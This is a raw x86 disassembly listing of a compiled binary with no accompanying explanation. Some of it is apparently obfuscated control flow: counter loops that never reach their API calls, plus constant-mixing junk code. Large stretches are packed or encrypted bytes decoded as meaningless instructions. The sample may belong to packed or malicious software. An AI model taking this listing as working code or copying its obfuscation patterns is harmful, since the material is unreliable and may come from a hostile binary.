  405932:	xor    DWORD PTR fs:[ebp+0x7d4c78f8],ebp
  405939:	arpl   cx,sp
  40593b:	jne    0x4058e2
  40593d:	aas    
  40593e:	lock sub eax,0x794a9251
  405944:	mov    ebp,0x7f739086
  405949:	and    al,0xb9
  40594b:	cmp    esi,DWORD PTR [ebx+esi*4+0x404b0f0]
  405952:	xchg   edx,eax
  405953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405954:	push   ds
  405955:	adc    dh,BYTE PTR [esi]
  405957:	sbb    DWORD PTR [eax-0x5fcf261a],ebx
  40595d:	jnp    0x4058eb
  40595f:	xchg   DWORD PTR [ebp+0x30],edi
  405962:	and    eax,0x41fd9ba9
  405967:	fdivr  st,st(1)
  405969:	push   eax
  40596a:	lods   al,BYTE PTR ds:[esi]
  40596b:	sbb    BYTE PTR [edx-0x4d2b5cb],dh
  405971:	gs push cs
  405973:	fadd   QWORD PTR [edx*4-0x2e37bfb7]
  40597a:	mov    ebp,ebx
  40597c:	dec    esp
  40597d:	jmp    0xaef5:0xf0220962
  405984:	call   0x1a25:0x2ec30a77
  40598b:	adc    edi,ebp
  40598d:	jae    0x4059b4
  40598f:	jp     0x40593e
  405991:	les    esp,FWORD PTR [esi+0x11e1090e]
  405997:	add    bh,dh
  405999:	sub    edi,DWORD PTR [eax-0x3e2bab65]
  40599f:	mov    WORD PTR [edx-0x53f27c1b],?
  4059a5:	mov    eax,0x9ba67336
  4059aa:	push   ecx
  4059ab:	inc    ebx
  4059ac:	push   0x1c
  4059ae:	pop    es
  4059af:	out    0xea,eax
  4059b1:	mov    bl,0x8a
  4059b3:	hlt    
  4059b4:	jbe    0x405965
  4059b6:	xchg   ebx,eax
  4059b7:	scas   al,BYTE PTR es:[edi]
  4059b8:	push   ds
  4059b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ba:	mov    al,ds:0x8be3f4c9
  4059bf:	or     eax,0x40d64c
  4059c4:	add    DWORD PTR [eax],ecx
  4059c6:	pop    edi
  4059c7:	pop    esi
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	shl    BYTE PTR [ecx+eiz*1+0x7e0b869b],cl
  405aca:	jle    0x405aef
  405acc:	jg     0x405b4c
  405ace:	jle    0x405b41
  405ad0:	mov    edx,0xacb09095
  405ad5:	popa   
  405ad6:	aaa    
  405ad7:	push   es
  405ad8:	pusha  
  405ad9:	out    0x89,al
  405adb:	mov    WORD PTR [edx-0x554ef8cc],?
  405ae1:	add    cl,BYTE PTR [ecx+edx*8-0x2c8ddebe]
  405ae8:	ret    
  405ae9:	pop    eax
  405aea:	imul   ecx,DWORD PTR [ebx],0x36
  405aed:	push   esi
  405aee:	enter  0x5302,0x3e
  405af2:	(bad)  
  405af3:	and    eax,0x5a370709
  405af8:	shl    eax,cl
  405afa:	cmp    eax,0x9479825a
  405aff:	and    BYTE PTR [ecx],dh
  405b01:	gs addr16 sub al,0x6b
  405b05:	in     al,dx
  405b06:	jle    0x405ac1
  405b08:	or     dh,0x8
  405b0b:	adc    DWORD PTR [eax],esp
  405b0d:	cmp    BYTE PTR [ecx+0x66],bh
  405b10:	ins    BYTE PTR es:[edi],dx
  405b11:	fdivr  QWORD PTR [esp+ebp*1-0x20]
  405b15:	aaa    
  405b16:	(bad)  
  405b17:	sub    bl,dl
  405b19:	push   ecx
  405b1a:	cmc    
  405b1b:	sub    bl,dh
  405b1d:	fwait
  405b1e:	xchg   edx,eax
  405b1f:	lods   al,BYTE PTR ds:[esi]
  405b20:	add    BYTE PTR [edi],ch
  405b22:	push   eax
  405b23:	xor    BYTE PTR [edx+0x2185d7fd],0x3e
  405b2a:	mov    eax,ebx
  405b2c:	(bad)  
  405b2e:	and    al,al
  405b30:	or     esi,DWORD PTR [eax-0x29839459]
  405b36:	adc    DWORD PTR [ebx+0x72],esp
  405b39:	dec    ecx
  405b3a:	or     ebx,ebp
  405b3c:	(bad)  
  405b3d:	mov    edi,0x9db5de47
  405b42:	sar    dh,1
  405b44:	pop    ecx
  405b45:	repnz in al,0x6d
  405b48:	pusha  
  405b49:	fiadd  WORD PTR [esi-0x783301fd]
  405b4f:	lods   eax,DWORD PTR ds:[esi]
  405b50:	dec    ebx
  405b51:	jge    0x405bc2
  405b53:	add    eax,0xcff2f986
  405b58:	gs or  al,0x2a
  405b5b:	adc    esp,DWORD PTR [eax+ebx*1]
  405b5e:	cmp    ecx,DWORD PTR [esi+0x78]
  405b61:	outs   dx,DWORD PTR ds:[esi]
  405b62:	ja     0x405b44
  405b64:	xor    eax,0x593ecaa4
  405b69:	je     0x405b42
  405b6b:	xor    eax,0x28541c76
  405b70:	int    0xff
  405b72:	loop   0x405b96
  405b74:	add    ebp,DWORD PTR [ebx]
  405b76:	dec    eax
  405b77:	mov    cl,0x64
  405b79:	into   
  405b7a:	ins    DWORD PTR es:[edi],dx
  405b7b:	ret    0xbf11
  405b7e:	test   eax,0x33741f96
  405b83:	daa    
  405b84:	mov    eax,ds:0xfd81b83d
  405b89:	xchg   ecx,eax
  405b8a:	mov    dl,BYTE PTR [ecx-0x28]
  405b8d:	jl     0x405bca
  405b8f:	shl    dh,cl
  405b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b92:	mov    ebp,DWORD PTR [edi+0x4866021c]
  405b98:	inc    ebx
  405b99:	push   0x267f52e
  405b9e:	sub    al,0x97
  405ba0:	cmp    BYTE PTR [edi],0x46
  405ba3:	jle    0x405c1c
  405ba5:	or     DWORD PTR ds:[esi+ebx*2+0x318ee6cf],edi
  405bad:	out    0x69,al
  405baf:	cmp    eax,0xd2ea4992
  405bb4:	mov    ecx,0xe2cd2d6b
  405bb9:	lea    eax,[edi-0x32]
  405bbc:	push   ss
  405bbd:	test   BYTE PTR [eax+esi*8-0x15],dh
  405bc1:	add    al,0x19
  405bc3:	push   0x111971c7
  405bc8:	loope  0x405be8
  405bca:	(bad)  
  405bcc:	ja     0x405b96
  405bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bcf:	jno    0x405bb3
  405bd1:	jge    0x405b59
  405bd3:	jmp    0xb215f134
  405bd8:	(bad)  
  405bd9:	out    0x84,eax
  405bdb:	cmp    ecx,ebp
  405bdd:	pushf  
  405bde:	mov    al,0x9d
  405be0:	sbb    BYTE PTR [ecx+0x4b],bh
  405be3:	and    eax,0xf11998ba
  405be8:	jg     0x405c0c
  405bea:	mov    ecx,0x38654165
  405bef:	jns    0x405c00
  405bf1:	sub    al,0xb0
  405bf3:	xchg   esi,eax
  405bf4:	xchg   BYTE PTR [bp+si+0x1371],cl
  405bf9:	(bad)  
  405bfa:	and    DWORD PTR [edi],edi
  405bfc:	jbe    0x405bec
  405bfe:	inc    ecx
  405bff:	fisub  WORD PTR [ebp+0xa]
  405c02:	and    BYTE PTR [ecx-0x7ef7aa75],0x25
  405c09:	mov    BYTE PTR [ebp+0x42],0x0
  405c0d:	add    BYTE PTR [eax],al
  405c0f:	add    BYTE PTR [eax],al
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	sub    al,0x6d
  405c6a:	xchg   DWORD PTR [edi],edx
  405c6c:	dec    ebx
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405c48
  405c75:	test   eax,0xd8e861bc
  405c7a:	jg     0x405c92
  405c7c:	fs retf 
  405c7e:	jmp    DWORD PTR [eax-0xf]
  405c81:	in     al,dx
  405c82:	sbb    cl,ah
  405c84:	mov    ebp,0xf8323bec
  405c89:	outs   dx,BYTE PTR ds:[esi]
  405c8a:	ret    0x7a06
  405c8d:	lock mov cs,WORD PTR [ebx+0x3f539e35]
  405c94:	inc    esp
  405c95:	jnp    0x405c1e
  405c97:	sbb    al,BYTE PTR [ebx-0x2a]
  405c9a:	jecxz  0x405c68
  405c9c:	clc    
  405c9d:	sbb    eax,DWORD PTR [ecx]
  405c9f:	jecxz  0x405c8c
  405ca1:	out    0x7a,al
  405ca3:	out    0x96,eax
  405ca5:	cdq    
  405ca6:	mov    ah,0x31
  405ca8:	loope  0x405d16
  405caa:	push   0xbfdd5b37
  405caf:	je     0x405c76
  405cb1:	push   edi
  405cb2:	mov    dl,0xc9
  405cb4:	cmp    edx,DWORD PTR [esi-0x39a916da]
  405cba:	jle    0x405cea
  405cbc:	inc    eax
  405cbd:	dec    esp
  405cbe:	cmc    
  405cbf:	sbb    DWORD PTR [ebx-0x5c],eax
  405cc2:	rcr    esi,cl
  405cc4:	(bad)  
  405cc5:	in     al,0xa3
  405cc7:	aaa    
  405cc8:	lea    ebx,[ecx-0x46]
  405ccb:	sub    ebx,0xffffffc8
  405cce:	lods   eax,DWORD PTR ds:[esi]
  405ccf:	nop
  405cd0:	lock cmp BYTE PTR [ebx-0x64],ah
  405cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd5:	xchg   edx,eax
  405cd6:	sbb    al,0xf5
  405cd8:	push   esi
  405cd9:	push   es
  405cda:	pop    ecx
  405cdb:	(bad)  
  405cdd:	(bad)  
  405cde:	scas   al,BYTE PTR es:[edi]
  405cdf:	dec    edx
  405ce0:	jns    0x405d16
  405ce2:	and    eax,0xeba632b6
  405ce7:	dec    edi
  405ce8:	jmp    0x8372:0x4bb28546
  405cef:	mov    ds:0x626b9c0,al
  405cf4:	scas   al,BYTE PTR es:[edi]
  405cf5:	mov    cl,0xcc
  405cf7:	add    BYTE PTR [ecx],ah
  405cf9:	push   ecx
  405cfa:	loopne 0x405cc8
  405cfc:	xchg   ebx,eax
  405cfd:	clc    
  405cfe:	ret    0x5ffc
  405d01:	push   ds
  405d02:	ins    BYTE PTR es:[edi],dx
  405d03:	rcr    ah,1
  405d05:	test   BYTE PTR [eax+edx*2-0x11],ch
  405d09:	btr    DWORD PTR [ecx+0x71],eax
  405d0d:	xchg   esi,eax
  405d0e:	add    DWORD PTR [esi-0x2c],edi
  405d11:	push   esp
  405d12:	pop    ds
  405d13:	fistp  DWORD PTR [ecx]
  405d15:	cld    
  405d16:	mov    ebx,0x4d594be3
  405d1b:	pop    esp
  405d1c:	jmp    0x1322:0x1293629e
  405d23:	dec    esp
  405d24:	pop    ebx
  405d25:	loopne 0x405cfa
  405d27:	mov    ds:0x533b3ac0,eax
  405d2c:	push   edi
  405d2d:	xor    edi,edx
  405d2f:	push   edi
  405d30:	sbb    al,0xf9
  405d32:	and    eax,0x3f4d509e
  405d37:	pop    ebx
  405d38:	xchg   edi,eax
  405d39:	or     ah,ah
  405d3b:	into   
  405d3c:	push   ds
  405d3d:	xor    BYTE PTR [ebp-0x66a342ad],0x41
  405d44:	(bad)  
  405d46:	(bad)  
  405d47:	std    
  405d48:	push   ebx
  405d49:	arpl   WORD PTR [esi-0x63dc3579],ax
  405d4f:	inc    eax
  405d50:	xchg   edi,eax
  405d51:	leave  
  405d52:	push   0xffffffae
  405d54:	cmc    
  405d55:	lock adc BYTE PTR [eax+ecx*2],bl
  405d59:	jmp    0x405dd7
  405d5b:	mov    al,ds:0x1848d2b6
  405d60:	fwait
  405d61:	mov    eax,ds:0x16009e51
  405d66:	sbb    DWORD PTR [esi-0x66],edx
  405d69:	mov    ebx,0x1d7ce413
  405d6f:	jno    0x405d12
  405d71:	enter  0x3d22,0x69
  405d75:	dec    edx
  405d76:	pop    ecx
  405d77:	add    BYTE PTR [ebx-0x55],dh
  405d7a:	jae    0x405dae
  405d7c:	arpl   WORD PTR [ecx],bp
  405d7e:	xchg   edx,eax
  405d7f:	shr    BYTE PTR [edx+0x5a],cl
  405d82:	sbb    al,0x80
  405d84:	(bad)  
  405d85:	sbb    BYTE PTR [ebp+0x68],dl
  405d88:	push   esp
  405d89:	lods   eax,DWORD PTR ds:[esi]
  405d8a:	das    
  405d8b:	push   edi
  405d8c:	mov    fs,ebx
  405d8e:	(bad)  
  405d8f:	xlat   BYTE PTR ds:[ebx]
  405d90:	add    DWORD PTR [eax-0x7e],ebx
  405d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d94:	jmp    0x18ee5031
  405d99:	xchg   ebx,eax
  405d9a:	xchg   edx,eax
  405d9b:	pop    eax
  405d9c:	cmp    edi,edi
  405d9e:	mov    ah,0xc1
  405da0:	cmc    
  405da1:	mov    al,ds:0xbd1e714d
  405da6:	shl    BYTE PTR [esi+0xc5589ce],0x47
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	repz jne 0x405d4e
  405dc1:	ret    0xe7c
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405dfe
  405dcb:	jno    0x405dcf
  405dcd:	jecxz  0x405e07
  405dcf:	jno    0x405d98
  405dd1:	mov    esp,0x35de54ff
  405dd6:	pop    esi
  405dd7:	mov    eax,0xf20fc5b6
  405ddc:	add    WORD PTR ss:[ebp+0x31934eae],bp
  405de4:	int    0x37
  405de6:	xor    esp,DWORD PTR [eax]
  405de8:	push   es
  405de9:	lds    edx,FWORD PTR [edi+0x32]
  405dec:	mov    edx,0xa9d5c637
  405df1:	or     DWORD PTR [eax+0x3],ecx
  405df4:	(bad)  
  405df5:	inc    DWORD PTR [esi-0x1d]
  405df8:	push   ebx
  405df9:	and    al,0x81
  405dfb:	jae    0x405e31
  405dfd:	scas   eax,DWORD PTR es:[edi]
  405dfe:	cdq    
  405dff:	sbb    eax,DWORD PTR [ecx+0x4c3c7cc]
  405e05:	push   cs
  405e06:	test   DWORD PTR [eax],ecx
  405e08:	mov    ah,0x5e
  405e0a:	stc    
  405e0b:	xlat   BYTE PTR ds:[ebx]
  405e0c:	ror    BYTE PTR ds:0x9c177bf0,0xf9
  405e13:	mov    eax,0x9b843317
  405e18:	les    edi,FWORD PTR [ecx-0x7e9c5943]
  405e1e:	ins    BYTE PTR es:[edi],dx
  405e1f:	(bad)  
  405e20:	rcr    BYTE PTR [edi],1
  405e22:	les    edi,FWORD PTR [ecx]
  405e24:	jge    0x405e04
  405e26:	push   ebx
  405e27:	pop    edx
  405e28:	retf   0xdca7
  405e2b:	xor    eax,0x1d1bc88c
  405e30:	mov    bh,0x87
  405e32:	xor    BYTE PTR [edi+0x2f],al
  405e35:	imul   ebx,ecx,0xffffffd0
  405e38:	add    DWORD PTR [edi+esi*1],0xf98245d6
  405e3f:	xchg   DWORD PTR [edx],edi
  405e41:	push   edi
  405e42:	pop    ebx
  405e43:	stos   BYTE PTR es:[edi],al
  405e44:	les    ebx,FWORD PTR ds:0x382167d2
  405e4a:	mov    esp,0x7ad2feec
  405e4f:	inc    edx
  405e50:	rcl    DWORD PTR [edi-0x6c],1
  405e53:	sbb    ah,BYTE PTR [ecx+0x2f]
  405e56:	add    al,0x68
  405e58:	fiadd  DWORD PTR [edi+0x27]
  405e5b:	jp     0x405e68
  405e5d:	int3   
  405e5e:	xor    esp,DWORD PTR ds:0xc7332565
  405e64:	jb     0x405ed8
  405e66:	add    eax,0xc83f0aca
  405e6b:	mov    ah,0xfa
  405e6d:	fist   WORD PTR [edi+0x3edf76ce]
  405e73:	or     ecx,DWORD PTR [edx]
  405e75:	jge    0x405e44
  405e77:	out    dx,al
  405e78:	sbb    DWORD PTR [ebp+0x2a],0xffffffa3
  405e7c:	and    eax,0x38d7c970
  405e81:	es mov eax,0xa2ddbcfe
  405e87:	ins    DWORD PTR es:[edi],dx
  405e88:	cmp    DWORD PTR [ecx-0x77],ebx
  405e8b:	pop    eax
  405e8c:	mov    ds:0x1c717076,al
  405e91:	and    bl,BYTE PTR [ecx+0x4d752bd9]
  405e97:	jmp    0x84ae2161
  405e9c:	neg    ch
  405e9e:	dec    eax
  405e9f:	shr    bh,cl
  405ea1:	mov    bh,0x7f
  405ea3:	shr    DWORD PTR [edx-0x32],0x39
  405ea7:	not    DWORD PTR [ebp+0x50]
  405eaa:	les    esp,FWORD PTR [esi-0x80]
  405ead:	pusha  
  405eae:	xchg   ebp,eax
  405eaf:	pop    edx
  405eb0:	ror    dl,1
  405eb2:	mov    ebx,DWORD PTR [ebx+0x38331796]
  405eb8:	mov    ah,0x8d
  405eba:	bound  ebx,QWORD PTR [edi]
  405ebc:	inc    ebx
  405ebd:	jnp    0x405f1c
  405ebf:	retf   0x2e93
  405ec2:	arpl   WORD PTR [edx+0x23],ax
  405ec5:	popf   
  405ec6:	adc    eax,DWORD PTR [edi+0x59]
  405ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eca:	pop    ecx
  405ecb:	and    BYTE PTR [eax+0x78e02340],cl
  405ed1:	enter  0xaee2,0xc7
  405ed5:	add    bl,bh
  405ed7:	push   edi
  405ed8:	repnz test eax,0x1a679915
  405ede:	cs push ss
  405ee0:	test   eax,0xe6e152cd
  405ee5:	bsf    edx,DWORD PTR [ecx-0x6f7401f9]
  405eec:	sbb    ah,BYTE PTR [eax+0x17]
  405eef:	aas    
  405ef0:	mov    esp,0xac1c53db
  405ef5:	scas   eax,DWORD PTR es:[edi]
  405ef6:	test   al,0xba
  405ef8:	lock adc al,0x14
  405efb:	jbe    0x405f59
  405efd:	out    dx,eax
  405efe:	xchg   ecx,eax
  405eff:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  405f06:	xor    edi,edi
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x43db13c5
  406054:	dec    edi
  406055:	pop    esp
  406056:	xchg   BYTE PTR [ecx],ah
  406058:	movd   DWORD PTR [esi+0x23],mm7
  40605c:	jg     0x4060dc
  40605e:	jle    0x40600e
  406060:	push   ebp
  406061:	out    dx,al
  406062:	cdq    
  406063:	dec    esp
  406064:	inc    edx
  406065:	popa   
  406066:	loop   0x406025
  406068:	neg    DWORD PTR [edi-0x2a2e34b9]
  40606e:	mov    DWORD PTR [edi-0x54],ebx
  406071:	(bad)  
  406072:	fldcw  WORD PTR [ebp-0x3e]
  406075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406076:	iret   
  406077:	mov    ah,0x8f
  406079:	(bad)  
  40607b:	addr16 cmp al,0xae
  40607e:	fstp   QWORD PTR ds:[esi+0x4a]
  406082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406083:	scas   eax,DWORD PTR es:[edi]
  406084:	mov    eax,ds:0xa731e5a7
  406089:	clc    
  40608a:	pop    ebx
  40608b:	rcr    BYTE PTR [ecx-0x26add5cd],cl
  406091:	jl     0x4060f1
  406093:	ja     0x40601d
  406095:	push   edi
  406096:	adc    BYTE PTR [edi+0x3a5c94fe],ah
  40609c:	dec    ecx
  40609d:	pop    ebp
  40609e:	les    eax,FWORD PTR [edx+0x3f]
  4060a1:	jb     0x40604f
  4060a3:	adc    DWORD PTR [ebx-0x61ed5c14],edi
  4060a9:	xchg   ebx,eax
  4060aa:	and    al,0x3
  4060ac:	mov    eax,ds:0xf9698673
  4060b1:	cli    
  4060b2:	fwait
  4060b3:	test   eax,ebx
  4060b5:	cdq    
  4060b6:	push   cs
  4060b7:	pop    ds
  4060b8:	imul   esi,DWORD PTR [edi+ebx*8-0x1949de8a],0x4e
  4060c0:	pop    esp
  4060c1:	or     al,0xed
  4060c3:	push   ebx
  4060c4:	xchg   esp,eax
  4060c5:	pop    ebx
  4060c6:	dec    DWORD PTR [edx+0x5b]
  4060c9:	and    DWORD PTR [ebx+edi*1+0x6e5165a2],esp
  4060d0:	sbb    esi,ebx
  4060d2:	mov    bh,0x7f
  4060d4:	repz fadd st(7),st
  4060d7:	sbb    BYTE PTR [edi],bl
  4060d9:	push   ds
  4060da:	sar    BYTE PTR [edx-0x2943eb8],1
  4060e0:	jmp    FWORD PTR [ecx-0x80]
  4060e3:	aad    0xb7
  4060e5:	lea    ebp,[edx-0x4e]
  4060e8:	pop    ds
  4060e9:	push   ds
  4060ea:	lahf   
  4060eb:	push   es
  4060ec:	sub    DWORD PTR [eax-0x2],ebx
  4060ef:	xor    ah,al
  4060f1:	cmp    edx,DWORD PTR [ecx+0x4c]
  4060f4:	push   esi
  4060f5:	scas   al,BYTE PTR es:[edi]
  4060f6:	data16 jecxz 0x406107
  4060f9:	push   edx
  4060fa:	fnsave [edi+0x1210b219]
  406100:	push   ebx
  406101:	sbb    ch,bl
  406103:	idiv   BYTE PTR [ecx]
  406105:	jbe    0x40617f
  406107:	(bad)  
  406108:	sbb    ebp,DWORD PTR [esi-0x29065385]
  40610e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40610f:	inc    esi
  406110:	inc    ebx
  406111:	add    BYTE PTR [ebx],0x42
  406114:	mov    al,ds:0x409bb61f
  406119:	sbb    si,WORD PTR [ecx-0x14638436]
  406120:	pop    edi
  406121:	xor    al,0xf1
  406123:	mov    bh,0x33
  406125:	addr16 xor eax,eax
  406128:	xchg   DWORD PTR [edi],ecx
  40612a:	mov    eax,ds:0x34bb40ac
  40612f:	pop    ebx
  406130:	scas   al,BYTE PTR es:[edi]
  406131:	mov    bl,0xf2
  406133:	dec    ebx
  406134:	mov    eax,ds:0xff9d6d95
  406139:	stos   DWORD PTR es:[edi],eax
  40613a:	out    0x3d,al
  40613c:	test   eax,0x9144750b
  406141:	imul   esp,DWORD PTR [edx-0x39af3e0],0xffffffc9
  406148:	mov    eax,0x5c89d1df
  40614d:	mov    edx,0xb7d6ce64
  406152:	sti    
  406153:	xchg   edx,eax
  406154:	xchg   ebp,eax
  406155:	addr16 lock cmc 
  406158:	outs   dx,BYTE PTR ds:[esi]
  406159:	fild   DWORD PTR [ebp-0x73]
  40615c:	xor    DWORD PTR [ebx-0x5],edi
  40615f:	fild   DWORD PTR [ebx+edx*8+0x77]
  406163:	cmp    BYTE PTR ss:[esi-0x36],bl
  406167:	mov    al,0x6f
  406169:	into   
  40616a:	pop    esp
  40616b:	pusha  
  40616c:	das    
  40616d:	push   edx
  40616e:	leave  
  40616f:	mov    BYTE PTR [ebx],dh
  406171:	in     eax,dx
  406172:	push   cs
  406173:	stos   DWORD PTR es:[edi],eax
  406174:	push   0x1
  406176:	cmc    
  406177:	jmp    0x406194
  406179:	dec    ebp
  40617a:	cmp    BYTE PTR [ebx-0x1efdee16],0x15
  406181:	xchg   edx,eax
  406182:	and    al,0x55
  406184:	mov    ecx,0x7805dcb7
  406189:	nop
  40618a:	cld    
  40618b:	sbb    DWORD PTR [edi-0x3fea2154],edx
  406191:	dec    edx
  406192:	sbb    esi,edx
  406194:	push   ebx
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
